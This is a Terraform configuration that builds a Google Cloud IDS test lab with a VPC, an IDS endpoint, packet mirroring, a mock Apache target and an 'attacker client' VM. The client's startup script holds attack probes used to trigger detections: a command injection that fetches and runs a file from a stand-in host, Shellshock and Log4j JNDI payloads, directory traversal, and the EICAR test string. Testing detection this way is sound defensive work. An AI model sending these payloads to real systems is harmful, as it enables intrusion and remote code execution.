terraform {
  required_version = ">= 1.3.0"
  required_providers {
    google = {
      source  = "hashicorp/google"
      version = ">= 5.0.0"
    }
  }
}

provider "google" {
  project = var.project_id
  region  = var.region
  zone    = var.zone
}

# ==============================================================================
# 0. API Enablement & Networking Prerequisites (VPC, PSA Peering, Cloud NAT)
# ==============================================================================

resource "google_project_service" "required_apis" {
  for_each = toset([
    "compute.googleapis.com",
    "servicenetworking.googleapis.com",
    "ids.googleapis.com",
    "logging.googleapis.com",
    "iap.googleapis.com",
  ])
  project            = var.project_id
  service            = each.value
  disable_on_destroy = false
}

resource "google_compute_network" "ids_vpc" {
  name                    = var.vpc_name
  project                 = var.project_id
  auto_create_subnetworks = false
  depends_on              = [google_project_service.required_apis]
}

resource "google_compute_subnetwork" "ids_subnet" {
  name                     = var.subnet_name
  project                  = var.project_id
  region                   = var.region
  network                  = google_compute_network.ids_vpc.id
  ip_cidr_range            = var.subnet_cidr
  private_ip_google_access = true
}

# Private Services Access (PSA) IP allocation required by Cloud IDS
resource "google_compute_global_address" "ids_psa_range" {
  name          = "google-managed-services-${var.vpc_name}"
  project       = var.project_id
  purpose       = "VPC_PEERING"
  address_type  = "INTERNAL"
  prefix_length = 24
  network       = google_compute_network.ids_vpc.id
}

resource "google_service_networking_connection" "ids_psa_connection" {
  network                 = google_compute_network.ids_vpc.id
  service                 = "servicenetworking.googleapis.com"
  reserved_peering_ranges = [google_compute_global_address.ids_psa_range.name]
  depends_on              = [google_project_service.required_apis]
}

# Cloud Router & Cloud NAT so private VMs can install packages without public IPs
resource "google_compute_router" "ids_router" {
  name    = "${var.vpc_name}-nat-router"
  project = var.project_id
  region  = var.region
  network = google_compute_network.ids_vpc.id
}

resource "google_compute_router_nat" "ids_nat" {
  name                               = "${var.vpc_name}-nat-gw"
  project                            = var.project_id
  router                             = google_compute_router.ids_router.name
  region                             = var.region
  nat_ip_allocate_option             = "AUTO_ONLY"
  source_subnetwork_ip_ranges_to_nat = "ALL_SUBNETWORKS_ALL_IP_RANGES"
}

# Firewall: Allow IAP SSH ingress (35.235.240.0/20) to VMs
resource "google_compute_firewall" "allow_iap_ssh" {
  name          = "${var.vpc_name}-allow-iap-ssh"
  project       = var.project_id
  network       = google_compute_network.ids_vpc.name
  direction     = "INGRESS"
  source_ranges = ["35.235.240.0/20"]
  target_tags   = ["ids-monitored"]

  allow {
    protocol = "tcp"
    ports    = ["22"]
  }
}

# Firewall: Allow internal HTTP & ICMP from Attacker Client VM to Target Server VM
resource "google_compute_firewall" "allow_internal_traffic" {
  name          = "${var.vpc_name}-allow-internal-http-icmp"
  project       = var.project_id
  network       = google_compute_network.ids_vpc.name
  direction     = "INGRESS"
  source_ranges = [var.subnet_cidr]
  target_tags   = ["ids-monitored"]

  allow {
    protocol = "tcp"
    ports    = ["80", "8080"]
  }

  allow {
    protocol = "icmp"
  }
}

# ==============================================================================
# 1. IDS Endpoint — Managed Cloud IDS Endpoint Collector
# ==============================================================================

resource "google_cloud_ids_endpoint" "ids_endpoint" {
  name              = var.ids_endpoint_name
  project           = var.project_id
  location          = var.zone
  network           = google_compute_network.ids_vpc.id
  severity          = var.ids_severity
  threat_exceptions = var.threat_exceptions
  description       = "Managed Cloud IDS Endpoint Collector for Packet Mirroring threat detection"

  depends_on = [
    google_service_networking_connection.ids_psa_connection
  ]
}

# ==============================================================================
# 2. Target VMs — Least-Privilege Service Account, Server VM & Client VM
# ==============================================================================

resource "google_service_account" "ids_vm_sa" {
  account_id   = "ids-test-vm-sa"
  display_name = "Cloud IDS Test VMs Least-Privilege Service Account"
  project      = var.project_id
}

resource "google_project_iam_member" "ids_vm_log_writer" {
  project = var.project_id
  role    = "roles/logging.logWriter"
  member  = "serviceAccount:${google_service_account.ids_vm_sa.email}"
}

resource "google_project_iam_member" "ids_vm_metric_writer" {
  project = var.project_id
  role    = "roles/monitoring.metricWriter"
  member  = "serviceAccount:${google_service_account.ids_vm_sa.email}"
}

# 2A. Target Server VM (runs Apache HTTP server + hosts standard EICAR test file)
resource "google_compute_instance" "target_server_vm" {
  name         = var.server_vm_name
  project      = var.project_id
  zone         = var.zone
  machine_type = "e2-medium"
  tags         = ["ids-monitored", "ids-target-server"]

  boot_disk {
    initialize_params {
      image = "debian-cloud/debian-12"
      size  = 20
      type  = "pd-balanced"
    }
  }

  network_interface {
    subnetwork = google_compute_subnetwork.ids_subnet.id
    network_ip = var.server_internal_ip
    # No access_config block -> private VM with no external IP
  }

  shielded_instance_config {
    enable_secure_boot          = true
    enable_vtpm                 = true
    enable_integrity_monitoring = true
  }

  metadata = {
    enable-oslogin = "TRUE"
  }

  metadata_startup_script = <<-EOF
    #!/usr/bin/env bash
    set -euo pipefail
    export DEBIAN_FRONTEND=noninteractive
    apt-get update -y
    apt-get install -y apache2 curl
    systemctl enable apache2
    systemctl start apache2

    mkdir -p /var/www/html/cgi-bin
    cat <<'EOT' > /var/www/html/weblogin.cgi
    <html><body><h1>Mock WebLogin CGI</h1></body></html>
    EOT
    cat <<'EOT' > /var/www/html/cgi-bin/test-critical
    <html><body><h1>Mock CGI Test Endpoint</h1></body></html>
    EOT

    # Create standard EICAR anti-malware test file (harmless industry-standard signature string)
    printf 'X5O!P%%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > /var/www/html/eicar.file
    chmod 644 /var/www/html/eicar.file /var/www/html/weblogin.cgi /var/www/html/cgi-bin/test-critical
  EOF

  service_account {
    email  = google_service_account.ids_vm_sa.email
    scopes = ["https://www.googleapis.com/auth/cloud-platform"]
  }

  depends_on = [google_compute_router_nat.ids_nat]
}

# 2B. Attacker Client VM (issues safe exploit/malware curl simulations against Target Server)
resource "google_compute_instance" "attacker_client_vm" {
  name         = var.client_vm_name
  project      = var.project_id
  zone         = var.zone
  machine_type = "e2-medium"
  tags         = ["ids-monitored", "ids-attacker-client"]

  boot_disk {
    initialize_params {
      image = "debian-cloud/debian-12"
      size  = 20
      type  = "pd-balanced"
    }
  }

  network_interface {
    subnetwork = google_compute_subnetwork.ids_subnet.id
    network_ip = var.client_internal_ip
    # No access_config block -> private VM with no external IP
  }

  shielded_instance_config {
    enable_secure_boot          = true
    enable_vtpm                 = true
    enable_integrity_monitoring = true
  }

  metadata = {
    enable-oslogin = "TRUE"
  }

  metadata_startup_script = <<-EOF
    #!/usr/bin/env bash
    set -euo pipefail
    export DEBIAN_FRONTEND=noninteractive
    apt-get update -y
    apt-get install -y curl dnsutils

    cat <<'SIM' > /usr/local/bin/run_ids_attack_sim.sh
    #!/usr/bin/env bash
    set -euo pipefail
    TARGET_IP="$${1:-${var.server_internal_ip}}"
    echo "=================================================================="
    echo " Running Safe Cloud IDS Attack Simulation against $${TARGET_IP}"
    echo "=================================================================="
    echo "[TC-01] Low Severity: OS Command Injection / WebLogin CGI Probe..."
    curl -s -o /dev/null "http://$${TARGET_IP}/weblogin.cgi?username=admin';cd%20/tmp;wget%20http://123.123.123.123/evil;sh%20evil;rm%20evil" || true
    sleep 2
    echo "[TC-02] Medium Severity: Directory Traversal (WINNT/win.ini)..."
    curl -s -o /dev/null "http://$${TARGET_IP}/?item=../../../../WINNT/win.ini" || true
    sleep 2
    echo "[TC-03] High Severity: GNU Bash RCE (Shellshock CVE-2014-6271)..."
    curl -s -o /dev/null -H 'User-Agent: () { :; }; 123.123.123.123:9999' "http://$${TARGET_IP}/cgi-bin/test-critical" || true
    sleep 2
    echo "[TC-04] Critical Severity: Apache Log4j JNDI Lookup Probe (CVE-2021-44228)..."
    curl -s -o /dev/null -H 'X-Api-Version: $${jndi:ldap://123.123.123.123:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}' "http://$${TARGET_IP}/" || true
    sleep 2
    echo "[TC-05] High/Critical Malware Signature: EICAR Standard Anti-Malware Test File..."
    curl -s -o /dev/null "http://$${TARGET_IP}/eicar.file" || true
    echo "=================================================================="
    echo " All 5 Cloud IDS simulation payloads sent to $${TARGET_IP}."
    echo "=================================================================="
    SIM
    chmod 755 /usr/local/bin/run_ids_attack_sim.sh
  EOF

  service_account {
    email  = google_service_account.ids_vm_sa.email
    scopes = ["https://www.googleapis.com/auth/cloud-platform"]
  }

  depends_on = [google_compute_router_nat.ids_nat]
}

# ==============================================================================
# 3. Packet Mirroring — Copy Traffic from Target VMs / Subnet to IDS Endpoint
# ==============================================================================

resource "google_compute_packet_mirroring" "ids_packet_mirroring" {
  name        = var.packet_mirroring_name
  project     = var.project_id
  region      = var.region
  description = "Packet Mirroring policy copying traffic from Target VMs/Subnets to Cloud IDS Endpoint"

  network {
    url = google_compute_network.ids_vpc.id
  }

  collector_ilb {
    url = google_cloud_ids_endpoint.ids_endpoint.endpoint_forwarding_rule
  }

  mirrored_resources {
    subnetworks {
      url = google_compute_subnetwork.ids_subnet.id
    }
    instances {
      url = google_compute_instance.target_server_vm.id
    }
    instances {
      url = google_compute_instance.attacker_client_vm.id
    }
  }

  filter {
    ip_protocols = []
    cidr_ranges  = ["0.0.0.0/0"]
    direction    = "BOTH"
  }
}
